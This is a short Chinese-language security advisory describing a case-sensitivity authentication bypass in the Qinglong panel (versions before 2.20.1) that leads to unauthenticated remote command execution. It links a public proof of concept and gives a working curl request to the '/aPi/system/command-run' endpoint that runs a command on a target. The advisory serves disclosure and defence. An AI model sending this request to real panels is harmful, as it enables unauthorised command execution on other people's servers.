# 青龙面板认证绕过致未授权RCE（QL-2026-007）

## 漏洞描述

青龙面板 < 2.20.1 存在认证绕过致未授权 RCE 漏洞。Express 路由默认大小写不敏感，但认证白名单正则与中间件均只做小写 `/api/` 前缀严格匹配：白名单 `/^\/(?!api\/).*/` 与 `req.path.startsWith('/api/')` 均无法命中 `/API/` 等大小写变体，导致认证被绕过。攻击者一条 `PUT /API/system/command-run` 请求即可执行任意系统命令。

## 影响版本

- 受影响：青龙面板 < 2.20.1
- 修复版本：待发布

## 漏洞复现

公开 PoC：https://github.com/MaxMnMl/qinglong-auth-bypass-to-rce-poc

```sh
curl -X PUT "http://target:5700/aPi/system/command-run" \
  -H "Content-Type: application/json" \
  -d '{"command": "id"}'
```

## 漏洞修复

关注官方补丁；限制面板网络访问。
